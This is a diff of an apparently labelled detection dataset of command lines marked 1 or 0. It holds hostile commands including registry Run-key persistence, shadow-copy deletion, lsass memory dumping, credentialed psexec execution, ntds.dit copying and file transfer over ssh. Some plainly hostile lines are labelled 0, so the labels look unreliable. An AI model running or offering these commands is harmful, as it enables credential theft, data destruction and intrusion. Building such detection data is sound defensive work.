@@ -1,6 +1,16 @@
-1	red add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
-1	red add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
-1	reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v "Atomic Red Team" /t REG_MULTI_SZ /d "${command_to_execute}" /f
-0	mstsc /v:${ip_address} /f
-0	cat ${source_file_path} | ssh ${username}@${ip_address} 'cat > ${destination_file_path}'
-0	copy ${shadow_copy_path}\windows\ntds\ntds.dit ${local_file_path}
+1	cmd /c "certutil -encode -Unicode -gmt -v error.txt encode.txt"
+1	powershell -c "certutil -encode -Unicode -gmt -v error.txt encode.txt"
+1	certutil -encode -UnicodeText -gmt -v -f error.txt encode.txt
+1	cmd /c "certutil -encode -UnicodeText -gmt -v -f error.txt encode.txt"
+1	powershell -c "certutil -encode -UnicodeText -gmt -v -f error.txt encode.txt"
+1	certutil -encode -UnicodeText -gmt -v error.txt encode.txt
+1	cmd /c "certutil -encode -UnicodeText -gmt -v error.txt encode.txt"
+1	powershell -c "certutil -encode -UnicodeText -gmt -v error.txt encode.txt"
+0	powershell -c "hostname.exe"
+0	rm -f ${local_file_path} 2> error.log
+0	rm -f ${local_file_path} 2> /dev/null
+0	powershell -c "vssadmin delete shadows /all /quiet"
+0	powershell -c "procdump -mm lsass lsassdump.dmp"
+0	powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+0	powershell -c "wmic.exe os get Caption,Version"
+0	powershell -c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
